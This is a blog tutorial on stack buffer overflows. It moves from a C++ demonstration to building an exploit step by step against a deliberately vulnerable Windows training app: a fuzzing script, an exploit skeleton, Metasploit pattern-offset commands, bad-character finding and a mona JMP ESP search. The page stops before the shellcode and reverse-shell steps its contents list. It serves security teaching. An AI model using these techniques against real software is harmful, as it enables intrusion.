<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">A Beginner’s Guide to Buffer Overflow</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/" rel="bookmark"><time class="entry-date published" datetime="2021-05-05T20:52:48+00:00">May 5, 2021</time><time class="updated" datetime="2025-05-31T13:02:42+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this guide, we are going to learn about what is a buffer overflow and how it occurs? Buffer Overflow occurs by overwriting memory fragments of a process or program. Overwriting values of certain pointers and registers of the process causes segmentation faults which cause several errors resulting in termination of the program execution in an unusual way.</span></p>
<h3 class="ai-optimize-7"><span style="color: #000000;"><span style="color: #800000;">Table of Content</span> </span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;"><strong>What is Buffer Overflow?</strong></span></li>
<li class="ai-optimize-9"><span style="color: #000000;"><strong>Types of Buffer Overflow</strong></span>
<ul>
<li class="ai-optimize-10"><span style="color: #000000;">Stack Buffer Overflow</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Heap Buffer Overflow</span></li>
</ul>
</li>
<li class="ai-optimize-12"><span style="color: #000000;"><strong>Stack Buffer Overflow Attack</strong></span></li>
<li class="ai-optimize-13"><span style="color: #000000;"><strong>How Stack Buffer Overflow Occurs?</strong></span></li>
<li class="ai-optimize-14"><span style="color: #000000;"><strong>Windows Buffer Overflow Attack</strong></span>
<ul>
<li class="ai-optimize-15"><span style="color: #000000;">Pre-Requisites for Demonstration</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Immunity Debugger</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Fuzzing</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">Registers</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">Offset Discovery &amp; Controlling EIP</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">Finding Bad Characters</span></li>
<li class="ai-optimize-21"><span style="color: #000000;">JMP ESP</span></li>
<li class="ai-optimize-22"><span style="color: #000000;">Endianness</span></li>
<li class="ai-optimize-23"><span style="color: #000000;">NOP-sled</span></li>
<li class="ai-optimize-24"><span style="color: #000000;">Shellcode Generation</span></li>
<li class="ai-optimize-25"><span style="color: #000000;">Final Exploit</span></li>
<li class="ai-optimize-26"><span style="color: #000000;">Reverse Shell</span></li>
</ul>
</li>
<li class="ai-optimize-27"><span style="color: #000000;"><strong>Conclusion<br/>
</strong></span></li>
</ul>
<h3 class="ai-optimize-28"><span style="color: #000000;"><span style="color: #800000;">What is Buffer Overflow?</span> </span></h3>
<p class="ai-optimize-29"><span style="color: #000000;">Buffers are memory allocations that are volatile, they temporarily hold the data while transferring data from one location to another. A buffer overflow occurs when the data being processed exceeds the storing capacity of the memory buffer. This results in the program overwriting oversized data in the adjacent memory locations which lead to overflow of the buffer. A buffer overflow occurs when we operate on buffers of char type.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;">We will try to understand this concept with few examples. For example, a buffer is designed in such a way that it would accept 8 bytes of data. In such a scenario if the data inputted by the user is more than 8 bytes. Then the data which is over 8 bytes would overwrite the adjacent memory surpassing the allocated buffer boundary. This would ultimately create segmentation faults followed by many other errors resulting in program execution is terminated.</span></p>
<p class="ai-optimize-31"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hKhYcHSgodY/YJL_hC53C0I/AAAAAAAAv2Y/9ezlwC8iAN8E2zeGJk6DIugW3ld6gxUOgCLcBGAsYHQ/s16000/1.jpg"/></span></p>
<p class="ai-optimize-32"><span style="color: #000000;">As we can see in the above representation, the memory allocated was 8 bytes while the data inputted by the user was 10 bytes which surpassed the buffer boundary, and those extra 2 bytes of data (E &amp; R) overwritten the adjacent memory locations. Now that we have a general understanding of Buffer Overflow, time to shed some light on the types of Buffer Overflow.</span></p>
<h3 class="ai-optimize-33"><span style="color: #800000;">Types of Buffer Overflow</span></h3>
<p class="ai-optimize-34"><span style="color: #000000;">There are two types of Buffer Overflow. Let us discuss a short introduction about both.</span></p>
<p class="ai-optimize-35"><span style="color: #000000;"><strong>Stack Buffer Overflows/Vanilla Buffer Overflow</strong></span></p>
<p class="ai-optimize-36"><span style="color: #000000;">It occurs when a program overwrites to a memory address on the program’s call stack outside of the buffer boundary which has a fixed length. In stack buffer overflow the extra data is written in adjacent buffers located on the stack. This usually results in the crashing of the application because of errors related to memory corruption caused in the overflown adjacent memory locations on the stack.</span></p>
<p class="ai-optimize-37"><span style="color: #000000;"><strong>Heap Buffer Overflow</strong></span></p>
<p class="ai-optimize-38"><span style="color: #000000;">Heap is a memory structure that is used to manage dynamic memory allocations. It is often used to allocate memory whose size is unknown at the time of compilation where the volume of memory required is so big that it cannot be fitted on the stack. A heap overflow or overrun is a type of buffer overflow that occurs in the heap data area. The exploitation of heap-based overflows is different from stack-based overflow exploitations. Memory on the heap is dynamically allocated at the runtime and typically contains program data. Exploitation is done by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list pointers.</span></p>
<h3 class="ai-optimize-39"><span style="color: #800000;">Stack Buffer Overflow Attack </span></h3>
<p class="ai-optimize-40"><span style="color: #000000;">The most common Buffer Overflow attack known as the stack-based buffer overflow or vanilla buffer overflow attack consists of a stack that is usually empty until and unless the program requires user input like a username or password. The program then writes a return memory address to the stack and then the user’s input is stored on top of it. While the stack is processed, the user’s input is sent to the return address specified by the program.  </span><br/>
<span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-70Mo1RRFbcs/YJL_mRTqmiI/AAAAAAAAv2c/RrO713GFJfoGYl8W8rr4KvJaFnBF1y43gCLcBGAsYHQ/s16000/2.png"/></span></p>
<p class="ai-optimize-41"><span style="color: #000000;">­</span><span style="color: #000000;">However, a specific amount of memory for the stack is allocated at the beginning which makes it finite. If the data inputted by the user is greater than the amount of allocated memory in the stack and the program doesn’t have any input verification in place which could verify that the data supplied will fit in the allocated memory or not, then it will result in an overflow. </span><br/>
<span style="color: #000000;">If the stack buffer is filled with data supplied by an untrusted user, then the user can corrupt the stack in such a way as to inject malicious executable code into the running program and take control of the process.</span></p>
<h3 class="ai-optimize-42"><span style="color: #000000;"><span style="color: #800000;">How Stack Buffer Overflow occurs</span> </span></h3>
<p class="ai-optimize-43"><span style="color: #000000;">Stack-based Buffer Overflows occurrence can be understood with the help of an example. We will be using a very simple C++ program to demonstrate stack-based buffer overflow/overrun.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">#include &lt;iostream&gt;
using namespace std;
int main()
{
char buffer[8];
cout&lt;&lt;"Input data : ";
cin&gt;&gt;buffer;
return 0;
}</pre>
<p class="ai-optimize-45"><span style="color: #000000;">In the above code, we used a character type variable and created an array named “buffer” which can store up to 8 bytes of data. This program waits for user input upon execution. Once a user puts data in the input field, the application stores the value in the allocated memory of 8 bytes. If the data supplied by the user is greater than 8 bytes, then it overwrites the adjacent memory locations resulting in termination of the process.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;">You can use any C++ compiler to execute the above-given program. We used an <a style="color: #000000;" href="https://www.onlinegdb.com/online_c++_compiler">online compiler</a> for this practical. Just copy-paste the above source code in the compiler and hit the run button.</span></p>
<p class="ai-optimize-47"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UOlWHvKatW0/YJL_rwBE6zI/AAAAAAAAv2g/ulpo8_B0FJA2kIvnYPEErefoPMigiOkvQCLcBGAsYHQ/s16000/3.jpg"/></span></p>
<h5 class="ai-optimize-6"><strong><span style="color: #000000;">Triggering the Overflow</span></strong></h5>
<p class="ai-optimize-48"><span style="color: #000000;">After Compilation, the program gets executed. Upon the first execution, we supplied “bufferov” as input data.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F8afHVnFMkQ/YJL_1ZgLI2I/AAAAAAAAv2o/Y0iFeOOoDx41gich11gkaVCTo2lyhUJxwCLcBGAsYHQ/s16000/5.jpg"/></span></p>
<p class="ai-optimize-50"><span style="color: #000000;">As we can see in the above image that the program exited normally with exit code 0. Exit code 0 refers to the successful execution of the process. This is because the user-supplied data input was of 8 bytes only.</span><br/>
<span style="color: #000000;">Followed by that attempt, we tested the program by supplying “bufferoverflow” as input data in the input field and checked the results.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-48xvkHsTgfQ/YJL_v76CuuI/AAAAAAAAv2k/4lDP_nJwFAU86VRRzlcS14871vlroGEKQCLcBGAsYHQ/s16000/4.jpg"/></span></p>
<p class="ai-optimize-52"><span style="color: #000000;">As we can see in the above image, it says stack smashing detected and the program exited with an exit code 134. Exit code 134 means that the program was aborted (received SIGABRT), perhaps as a result of a failed assertion.</span><br/>
<span style="color: #000000;">The stack smashing detected error is generated by the compiler in response to its defense mechanism against buffer overflows. Here, a buffer overflow occurred because the allocated buffer was designed to hold 8 bytes only while the user-supplied input data was 14 bytes. These extra 6 bytes surpassed the buffer boundary overwriting the adjacent memory locations present in the stack. This created a segmentation fault resulting in stack smashing error.</span></p>
<p class="ai-optimize-53"><span style="color: #000000;">Next, we will see how buffer overflow occurs in Windows applications and how to exploit them to gain a reverse shell.</span></p>
<h3 class="ai-optimize-54"><span style="color: #000000;"><span style="color: #800000;">Windows Buffer Overflow Attack</span> </span></h3>
<p class="ai-optimize-55"><span style="color: #000000;">Buffer Overflow works across different platforms including Linux, Windows and any other flavour out there because it deals with memory rather than what’s built on top of it. Since, dealing with memory registers in Linux can be a bit difficult to go head first, we make a smart choice of first understand the various steps and techniques of Buffer Overflow on a Windows Machine with an executable before moving on further.</span></p>
<p class="ai-optimize-56"><span style="color: #000000;">In the demonstration of the Buffer Overflow Attacks on a Windows Device, we will use a publicly available Windows application that is vulnerable to buffer overflow attacks.</span></p>
<h4 class="ai-optimize-57"><span style="color: #000000;">Pre-Requisites for Demonstration</span></h4>
<p class="ai-optimize-58"><span style="color: #000000;"><strong>Vulnerable Application: </strong><a style="color: #000000;" href="https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.exe">d<span style="color: #0000ff;"><strong>ostackbufferoverflowgood.exe</strong></span></a></span></p>
<p class="ai-optimize-59"><span style="color: #000000;"><strong>Testing/Analysis Machine: </strong>Microsoft Windows 10 1903</span></p>
<p class="ai-optimize-60"><span style="color: #000000;"><strong>Attacker Machine: </strong>Kali Linux 2020.1</span></p>
<p class="ai-optimize-61"><span style="color: #000000;"><strong>Debugger used: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/kbandla/ImmunityDebugger">Immunity Debugger</a></span></strong></span></p>
<h4 class="ai-optimize-62"><span style="color: #000000;">Immunity Debugger</span></h4>
<p class="ai-optimize-63"><span style="color: #000000;">Immunity Debugger is a tool that we can use for malware analysis, exploit writing and reverse engineering binary files. In this practical, we will use Immunity Debugger to see how buffer overflow occurs in a binary by analyzing the registers, hex values, memory addresses, etc. </span></p>
<p class="ai-optimize-64"><span style="color: #000000;">Firstly, we will run the Immunity Debugger as administrator and open the vulnerable application with the debugger. After opening the application, we can see that initially, it is in paused state. To run the application we will press the play button present in the execution controls section.</span></p>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cgmsTG-Tau0/YJL_5uAeOBI/AAAAAAAAv2w/tzDYKNnrbqYlBLfalS0hwj14T79xCNSLACLcBGAsYHQ/s16000/6.jpg"/></span></p>
<p class="ai-optimize-66"><span style="color: #000000;">Once the vulnerable application has started the process state will change to “Running” from “Paused” as shown in the image below. The application will start listening on port number 31337.</span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-63U_jQaNz4A/YJL_93opTjI/AAAAAAAAv20/T0JaQpj0e4sw1H9HrIdt84IaqL4te9pJQCLcBGAsYHQ/s16000/7.jpg"/></span></p>
<p class="ai-optimize-68"><span style="color: #000000;">Once the application is in running state, we will run a Nmap scan through our attacking machine Kali to confirm that the application is listening on port number 31337 of the target machine.</span></p>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Eyq8hca02jk/YJMACUlftmI/AAAAAAAAv28/iEWOAMoGtZQatKZTX5uxVOjUYHFrvLUrACLcBGAsYHQ/s16000/8.jpg"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">Once it is confirmed that the application is listening on port 31337 we can move forward and check how the application functions. We will use Netcat to interact with the application.</span></p>
<p class="ai-optimize-71"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FiONHE79AP4/YJMBBJFmRWI/AAAAAAAAv3U/Ahcknz5u8RIkTTGh2jaoTbNqD0iK71JMwCLcBGAsYHQ/s16000/9.jpg"/></span></p>
<p class="ai-optimize-72"><span style="color: #000000;">As we can see in the above image, the application’s functionality is pretty simple. Whatever we type in the input field, it stores the supplied data in the allocated memory and returns the same data followed by a “Hello” message as the output.</span></p>
<p class="ai-optimize-73"><span style="color: #000000;">Next, we will try to fuzz the application and see if we can crash it or not.</span></p>
<h4 class="ai-optimize-74"><span style="color: #000000;">Fuzzing</span></h4>
<p class="ai-optimize-75"><span style="color: #000000;">Fuzzing is a technique that testers usually use in Black Box testing. In fuzzing, the Fuzzer automatically supplies some data to the application to trigger the implementation bugs.</span></p>
<p class="ai-optimize-76"><span style="color: #000000;">A Fuzzer is a program that injects data automatically in an application’s stack to trigger a bug/vulnerability as to test it. The data injected by the Fuzzer could be completely random, semi-random, or static depending upon how the Fuzzer is coded.</span></p>
<p class="ai-optimize-77"><span style="color: #000000;">Here we are using a Fuzzer that generates a bunch of A’s (\x41) and sends it to our vulnerable application. The number of A’s is incremented every time because of a while loop present in the Fuzzer’s code. Fuzzer repeats the process until and unless it detects a crash in the application and couldn’t connect to it anymore.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">!/usr/bin/env python3
import socket
import sys
ip = "192.168.0.5"
port = 31337
string = b"\x41" * 10
s = socket.socket()
s.connect((ip, port))
timeout = 5 
s.settimeout(timeout)
while True:
        try:
                        print("Fuzzing with {} bytes".format(len(string)))
                        s.send(string + b"\x0a\x0d")
                        string += b"\x41" * 10
                        s.recv(1024)
        except:
                print("Fuzzer crashed at {} bytes".format(len(string)))
                sys.exit(0)
s.close()
</pre>
<p class="ai-optimize-78"><span style="color: #000000;">Before fuzzing the application, it is important to check the process state in the debugger, it should be running. While the process is running we can start fuzzing the application using our fuzzer.py script whose source code is mentioned above.</span></p>
<p class="ai-optimize-79"><span style="color: #000000;">After running the Fuzzer, we can see that the Fuzzer stopped after sending 160 bytes of data in the application.</span></p>
<p class="ai-optimize-80"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yeSWAFPezg4/YJMAJaVXKHI/AAAAAAAAv3E/KsLkqz8uWOc1IZ4sh8QSxnEJYS3g-FcqACLcBGAsYHQ/s16000/10.jpg"/></span></p>
<p class="ai-optimize-81"><span style="color: #000000;">If we check the process state in Immunity Debugger, we could see that the application is in the paused state now. One more thing to be noticed is that the ESP register has overflown with A’s. This confirms that the application will crash if we send 160 A’s or 160 bytes of data in it.</span></p>
<p class="ai-optimize-82"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5lk0UH0jx9Y/YJMBKvRHk8I/AAAAAAAAv3Y/o6FwUExDfIAZ5yZhpSqe6JW0LuzwA9x5QCLcBGAsYHQ/s16000/11.jpg"/></span></p>
<h4 class="ai-optimize-83"><span style="color: #000000;">Registers</span></h4>
<ul>
<li class="ai-optimize-84"><span style="color: #000000;"><strong>EAX – </strong>It is an accumulator register used to perform arithmetic calculations like add, subtract, compare and store the return values from function calls.</span></li>
<li class="ai-optimize-85"><span style="color: #000000;"><strong>ECX – </strong>This register acts like a counter used for iterations, it counts in a downward manner.</span></li>
<li class="ai-optimize-86"><span style="color: #000000;"><strong>EDX – </strong>This register holds extra data to perform complex calculations like multiply and divide. It acts as an extension of the EAX register.</span></li>
<li class="ai-optimize-87"><span style="color: #000000;"><strong>EBX – </strong>It is the base register that doesn’t have any defined purpose, it can be used to store data.</span></li>
<li class="ai-optimize-88"><span style="color: #000000;"><strong>ESP – </strong>It is the stack pointer. It indicates the location in the memory where the current instruction starts. It always points to the top of the stack.</span></li>
<li class="ai-optimize-89"><span style="color: #000000;"><strong>EBP – </strong>It is the base pointer that points to the base of the stack.</span></li>
<li class="ai-optimize-90"><span style="color: #000000;"><strong>ESI – </strong>It is known as the source index register which holds the location of the input data.</span></li>
<li class="ai-optimize-91"><span style="color: #000000;"><strong>EDI – </strong>It is the destination index register which points to the location where the result of the processed data is stored.</span></li>
<li class="ai-optimize-92"><span style="color: #000000;"><strong>EIP – </strong>It is the instruction pointer register. It is a read-only register that holds the address of the next instruction which is to be read.</span></li>
</ul>
<h4 class="ai-optimize-93"><span style="color: #000000;">Offset Discovery &amp; Controlling EIP </span></h4>
<p class="ai-optimize-94"><span style="color: #000000;">EIP offset is the exact value that gives us the information that how many bytes will fill the buffer and overflow into the return address (EIP).</span></p>
<p class="ai-optimize-95"><span style="color: #000000;">Controlling the EIP is a very crucial part of buffer overflow attacks because EIP is the register that will ultimately point to our malicious code so that it could be executed. While fuzzing the application we saw that it was crashing at 160 bytes which means that EIP is located somewhere between 1 and 160 bytes. So, we will use a pattern creation tool in MSF which generates a pattern of certain bytes and it will lead us in finding the exact offset value. We will generate a pattern of 200 bytes. 40 bytes more for a little bit extra padding.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf-pattern_create -l 200</pre>
<p class="ai-optimize-96"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fPpRv_BVLeg/YJMBSV79DlI/AAAAAAAAv3g/_NloTg8-QVI5JJoY98uBfLV0TjjS8b1TwCLcBGAsYHQ/s16000/12.jpg"/></span></p>
<p class="ai-optimize-97"><span style="color: #000000;">Next, we will create a python script to exploit the vulnerability. This script will be modified step by step till we reach the final exploit code. At the present stage, this script has a variable named “buffer”, we will put in some values in this variable later and execute the script. This script sends all the data which is present in the “buffer” variable.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">import socket
ip = "192.168.0.5"
port = 31337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
buffer = " "
buffer += “\n”
s.send(buffer)</pre>
<p class="ai-optimize-98"><span style="color: #000000;">Every time the application crashes, we will have to make sure that we have restarted the application before we crash it again for testing. To do so we will press the rewind button in Immunity Debugger’s control execution panel and then select “Yes” in the next dialogue box.</span></p>
<p class="ai-optimize-99"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vwlYzKHwN-k/YJMBYNf0m8I/AAAAAAAAv3k/C4jqC2f0McU0cMprZJ5u9vqDRjAIyTm5gCLcBGAsYHQ/s16000/13.jpg"/></span></p>
<p class="ai-optimize-100"><span style="color: #000000;">Once the application has reloaded, hit the play button to run it. At this point, the process state should say “Running”.</span></p>
<p class="ai-optimize-101"><span style="color: #000000;">Next, we will insert the previously generated pattern of 200 bytes in our exploit code’s “buffer” variable.</span></p>
<p class="ai-optimize-102"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kgPDKg0WuhI/YJMBdDSGqgI/AAAAAAAAv3s/hJS6MIo_ifYBrW9pRfk7pN4B5JuZnk7kQCLcBGAsYHQ/s16000/14.jpg"/></span></p>
<h5 class="ai-optimize-10"><strong><span style="color: #000000;">Crashing the Application and Calculating the Exact Offset</span></strong></h5>
<p class="ai-optimize-103"><span style="color: #000000;">After updating the script we will execute it with the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python exploit.py</pre>
<p class="ai-optimize-104"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-XPxv8S9ptRs/YJMBkRKW_vI/AAAAAAAAv3w/SGQoA-ew37A8TNCkbGBb3FK1hUtpZNrBACLcBGAsYHQ/s0/15.jpg"/></strong></span></p>
<p class="ai-optimize-105"><span style="color: #000000;">Upon execution, the script will crash the application. We can confirm it by going back to our debugger.</span></p>
<p class="ai-optimize-106"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2wWmoXxvjf4/YJMBoyHyiqI/AAAAAAAAv34/iD-_vT1Rm0kK6UfT0lX4CAoAsdknDArBwCLcBGAsYHQ/s16000/16.jpg"/></span></p>
<p class="ai-optimize-107"><span style="color: #000000;">As we can see in the above image, the exploit caused an access violation error and the program crashed. ESP register now shows the pattern which we had sent to the application to crash it. Now if we look at the EIP register the value is <strong>39654138</strong>. We will use this value to find the EIP offset. To find it we will be using the pattern offset tool of MSF.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf-pattern_offset –l 200 –q 39654138</pre>
<p class="ai-optimize-108"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EjSA7XguTZ4/YJMBv8kAF1I/AAAAAAAAv4A/O0031eWe8z4Co1NxGWm-GPEF0ioP1BU5ACLcBGAsYHQ/w320-h67/17.jpg"/></span></p>
<p class="ai-optimize-109"><span style="color: #000000;">As we can see in the above image, we found an exact match at offset 146. So, our EIP offset is 146.</span></p>
<h5 class="ai-optimize-9"><strong><span style="color: #000000;">Verifying EIP Control to Confirm Exploitation Feasibility</span></strong></h5>
<p class="ai-optimize-110"><span style="color: #000000;">Next, we will update our exploit code accordingly. As we now know the EIP offset value, we don’t need to send the pattern anymore. We can simply send 146 A’s in place of the pattern. We will send 4 B’s after 146 A’s as to ensure whether we can control the EIP or not. If the EIP register has 4 B’s after the execution of the exploit, then it will be confirmed that we can control the EIP now.</span></p>
<p class="ai-optimize-111"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QaWKpo31d10/YJMB1RcFE6I/AAAAAAAAv4I/wzAdUkb85TowSD4h6enFMoPevC_qh-xXwCLcBGAsYHQ/s16000/18.jpg"/></span></p>
<p class="ai-optimize-112"><span style="color: #000000;">After updating the exploit code, we will run it again to check if we can control the EIP or not (don’t forget to re-run the application in Immunity Debugger before running the exploit).</span></p>
<p class="ai-optimize-113"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IZeKAqc3hpA/YJMB54sBKoI/AAAAAAAAv4Q/GABfOKi8o0UY7WXzq-CB3QtcI6jRWkFvgCLcBGAsYHQ/s16000/19.jpg"/></span></p>
<p class="ai-optimize-114"><span style="color: #000000;">As we can see in the above image, the EIP register has “42424242”. The hexadecimal value of ASCII character “B” is 0x42. So, it is confirmed at this point that we can control the EIP register.</span></p>
<h4 class="ai-optimize-115"><span style="color: #000000;">Finding Bad Characters</span></h4>
<p class="ai-optimize-116"><span style="color: #000000;">Bad characters are unwanted characters that break the shellcode. Finding and omitting the bad characters are necessary because bad characters terminate the string execution where ever they appear. If there is any bad character present in our shellcode in the end. Then its execution will be stopped where ever the bad character is situated, so we will be omitting all the bad characters while generating our shellcode.</span></p>
<p class="ai-optimize-117"><span style="color: #000000;">To find the bad characters we will first generate all characters with a python script and send it to the application to crash and analyze it. The code present below generates all characters from x01 to xff without x00 as x00 is a bad character by default. x00 is known as the null byte.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()</pre>
<p class="ai-optimize-118"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FqA9IhqP3UM/YJMB_hf8BVI/AAAAAAAAv4Y/iquzcl0xaBAm9uaqiglYruP3P2_1uCVvQCLcBGAsYHQ/s16000/20.jpg"/></span></p>
<h5 class="ai-optimize-8"><span style="color: #000000;"><strong>Analyzing Memory Dump to Detect and Eliminate Bad Characters</strong></span></h5>
<p class="ai-optimize-119"><span style="color: #000000;">Now, we will update our script again and send all the characters right now where we will be inserting our shellcode later.</span></p>
<p class="ai-optimize-120"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--3_TLSdiadc/YJMCEOeaQkI/AAAAAAAAv4c/tZQVCMKeGjEl1fmq0gAUeuD3_jCYPxzSACLcBGAsYHQ/s16000/21.jpg"/></span></p>
<p class="ai-optimize-121"><span style="color: #000000;">After running the updated script, we will compare the hex dump of ESP with all characters to look for any bad character appearing in the memory. To do so, we will select ESP and then select follow in the dump.</span></p>
<p class="ai-optimize-122"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pbI6RQVVeDY/YJMCJfyCi-I/AAAAAAAAv4k/XtoOaXCrsnkTOZNhfN8x8PqNi9jGP2gtQCLcBGAsYHQ/s16000/22.jpg"/></span></p>
<p class="ai-optimize-123"><span style="color: #000000;">Now, if we compare the hex dump with all characters that we sent then we will see that everything is going pretty fine from 01 to 09 but after 09, 21 is there instead of 0A. This means that “\x0a” is a bad character.</span></p>
<p class="ai-optimize-124"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5EqJvZObqUM/YJMCO6X_plI/AAAAAAAAv4s/wh9Qe2wLbDML3u8fOyuJBYPxbU8A8pj4QCLcBGAsYHQ/s16000/23.jpg"/></span></p>
<p class="ai-optimize-125"><span style="color: #000000;">Once we have found a bad character, we need to remove it from our exploit code and send it again to search for the next bad character. We need to repeat these steps until and unless our exploit is completely bad characters free.</span></p>
<p class="ai-optimize-126"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YsfgzZQMAps/YJMCTHaw_HI/AAAAAAAAv4w/loLH0EgK3l0K9Cze7qSKhozgYkYGdubUACLcBGAsYHQ/s16000/24.jpg"/></span></p>
<p class="ai-optimize-127"><span style="color: #000000;">After updating the exploit, we need to crash the application again and analyze the hex dump.</span></p>
<p class="ai-optimize-128"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nZw4oPupeLo/YJMCWoyJOfI/AAAAAAAAv44/5jAnl95GLyQ-_kFs5z1jMA7m9e0NZ4wqgCLcBGAsYHQ/s16000/25.jpg"/></span></p>
<p class="ai-optimize-129"><span style="color: #000000;">Now if we check the hex dump of ESP from 01 to FF. It can be seen in the above image that we have deduced all the bad characters now which means that “\x00” and “\x0a” were the only bad characters present.</span></p>
<p class="ai-optimize-130"><span style="color: #000000;">Now that our exploit is bad characters free, we need to find out the JMP ESP.</span></p>
<h4 class="ai-optimize-131"><span style="color: #000000;">JMP ESP </span></h4>
<p class="ai-optimize-132"><span style="color: #000000;">To find the JMP ESP we will use mona modules. We need to download <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://raw.githubusercontent.com/corelan/mona/master/mona.py">mona.py</a></strong></span> and paste it in C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands.</span></p>
<p class="ai-optimize-133"><span style="color: #000000;">When an access violation occurs, the ESP register points to memory which contains the data which we had sent to the application. JMP ESP Instruction is used to redirect the code execution to that location. To find the JMP ESP we need to use a module of mona with –cpb option and all the bad characters that we found earlier, this will avoid mona returning memory pointer having bad characters. After running the command we need to open up log data.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">!mona jmp -r esp -cpb "\x00\x0a"</pre>
<p class="ai-optimize-134"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yzanRbcOQIo/YJMCbVADoNI/AAAAAAAAv48/6oT6XAYd4zIYDUMMIN9WZpzzE99vcWHTwCLcBGAsYHQ/s16000/26.jpg"/></span></p>
<p class="ai-optimize-135"><span style="color: #000000;">Once we open up the log data window, we can see in the below image that mona has found 2 pointers. Both the pointers are having all the security mitigations like ASLR, Rebase, SafeSEH turned off. So, we will choose one of the pointers and follow it in disassembler.</span></p>
<p class="ai-optimize-136"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jgP08IPN49Q/YJMCfMNS9JI/AAAAAAAAv5A/fLsIQzgvNBIcWPc-p3BoB7LxuDJKNjx5wCLcBGAsYHQ/s16000/27.jpg"/></span></p>
<p class="ai-optimize-137"><span style="color: #000000;">Once we hit “Follow in Disassembler” the CPU-thread window will open up again.</span></p>
